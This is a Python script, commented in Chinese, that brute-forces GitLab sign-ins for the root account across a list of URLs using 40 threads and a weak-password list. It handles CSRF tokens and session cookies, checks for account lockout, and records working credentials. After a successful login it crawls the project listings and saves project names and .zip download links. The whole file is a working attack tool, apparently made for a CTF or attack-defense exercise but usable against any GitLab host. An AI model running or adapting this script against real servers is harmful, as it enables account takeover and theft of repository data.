import requests
from lxml import etree
import time
import threadpool


# 关闭报错信息
requests.packages.urllib3.disable_warnings()

def login(link, uname, passwd):
    url = link
    try:
        res1 = requests.get(url+"/users/sign_in", timeout=6, verify=False, allow_redirects=False)
        # print("get---",res1.status_code)
        token = str((etree.HTML(res1.text)).xpath('//meta[@name="csrf-token"]//@content')[0])
        # cookie = (res1.cookies.get_dict())['_gitlab_session']
        cookie = res1.cookies['_gitlab_session']
        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safar537.36",
            "Cookie": "_gitlab_session=" + cookie,
            "Connection": "keep-alive"
        }
        data = {
            "utf8": "✓",
            "authenticity_token": token,
            "user[login]": uname,
            "user[password]": passwd,
            "user[remember_me]": "0"
        }
    except:
        print("res1网页不存在或请求超时~")
        doc1 = open("res1err.txt", "a+", encoding="utf-8")
        doc1.write(url + "\n")
        doc1.close
        return False  # 网页出错请求超时时退出爆破
    try:
        res2 = requests.post(url+"/users/sign_in", headers=header, data=data, allow_redirects=False, timeout=6, verify=False)
        # print(str(res2.headers))
        # flag = re.findall(r"'Cache-Control': '(.*?)',", str(res2.headers))[0]
        flag = res2.headers['Cache-Control']
        # print(flag)
    except:
        print("res2报错")
        doc2 = open("res2err.txt", "a+", encoding="utf-8")
        doc2.write(url + "\n")
        doc2.close
        return False
    # print("post---",res2.status_code)
    if(res2.status_code != 302):
        # print("密码错误~")
        return True
    elif(flag == 'no-cache'):
        print(uname+"账号已被锁定")
        return False
    else:
        print("密码正确---("+ url +"---账号:"+ uname +"---密码:" + passwd,"),开始抓取仓库")
        do = open("end.txt", "a+",encoding="utf-8")
        do.write("("+ url +"---账号:"+ uname +"---密码:" + passwd +")\n\n\n")
        do.close
        cookie = res2.cookies.get_dict()
        page = 1
        getlist(url, cookie, page)
        return False
def getlist(url,cookie, page):
    try:
        # res3 = requests.get(url + "/dashboard/projects?non_archived=true&sort=name_asc&page=" + str(page), timeout=6, verify="False", cookies=cookie)
        # res3 = requests.get(url + "/admin/projects?non_archived=true&sort=name_asc&page=" + str(page), timeout=6, verify="False", cookies=cookie)
        res3 = requests.get(url + "/explore?non_archived=true&sort=name_asc&page=" + str(page), timeout=6, verify="False", cookies=cookie)
    except:
        print("res3报错~")
        doc3 = open("res3err.txt", "a+", encoding="utf-8")
        doc3.write(url + "\n")
        doc3.close
        return
    print(res3.status_code)

    tree = etree.HTML(res3.text)
    urllist=tree.xpath('//a[@class="text-plain"]/@href')
    # print(urllist)
    if(len(urllist) == 0):
        print("不存在gitlab项目")
    elif(len(urllist) == 20):
        print("仓库存在多页,开始抓取第"+str(page)+"页")
        schflag(url, urllist, cookie)
        # time.sleep(2)
        page = page + 1
        getlist(url, cookie, page)
    else:
        print("仓库剩1页,发现"+str(len(urllist))+"个项目")
        schflag(url, urllist, cookie)
        # time.sleep(2)
        return


def schflag(url, urllist, cookie):
    doc = open("end.txt", "a+",encoding="utf-8") # 打开要写入的文件
    for i in range(len(urllist)):
        try:
            res4 = requests.get(url + str(urllist[i]),timeout=6, verify="False", cookies=cookie)
            # print(res4.status_code)
            tree = etree.HTML(res4.text)
            flag_name=tree.xpath('//div[@class="sidebar-context-title"]/text()')[0]
            list_dir=tree.xpath('//p//text()')
            flag_dir= "NULL"
            if(len(list_dir) >= 1):
                flag_dir = str(list_dir[0])
            else:
                flag_dir = "NULL"
            flag_link = "NULL"
            list_link=tree.xpath('//@href')
            for j in list_link:
                if str(j.strip())[-4:] == ".zip":
                    flag_link =url + str(j.strip())
            end_str = str(flag_name).strip() + "," + flag_dir.strip() + "," + flag_link
            doc.write(end_str+"\n")
            print("正在抓取第" + str(i+1)+"/"+str(len(urllist))+"个标签~")
            time.sleep(0.2)
        except:
            print("当前flag抓取失败(项目可能为空)，抓取下一个~")

    doc.close
    print("当前页flag写入完毕")


def main(link):
    # unames = ["root", "admin", "admin123"]
    # passwds = ["123456789"]
    unames = ["root"]
    # passwds = ["root1234","123456789","root123456", "12345678", "asd123456"]
    passwds = ["88888888","","123qweasd", "iloveyou", "qq123456", "qwe123456"]
    # passwds = ["root1234"]
    # passwds = ["root123456789","qwer1234","root12345", "gitlab123", "gitlab1234"]
    # passwds = ["root1234","123456789","root123456", "12345678", "asd123456"]
    # passwds = ["root1234","123456789","root123456", "12345678", "asd123456"]
    # print("开始爆破---" + link)
    for uname in unames:
        print("尝试使用" + uname +"登录--" + link)
        for passwd in passwds:
            tmp = login(link, uname, passwd)
            if (tmp):
                pass
            else:
                break
            time.sleep(0.2)


def th():
    arr = []
    f = open("url.txt", 'r')
    for line in f.readlines():
        arr.append(line.strip('\n'))
    f.close
    print("读取到"+ str(len(arr)) + "个链接，开始爆破~")
    time.sleep(0.5)
    pool = threadpool.ThreadPool(40) #建立线程池  开启20个线程

    req = threadpool.makeRequests(main, arr)  #提交N个任务到线程池

    for r in req:#开始执行任务
        pool.putRequest(r)#提交  
    pool.wait()#等待完成

 
if __name__ == "__main__":
    th()
    # doc = open('3.txt', 'a+', encoding="utf-8")
    # doc.write(res3.text)
    # doc.close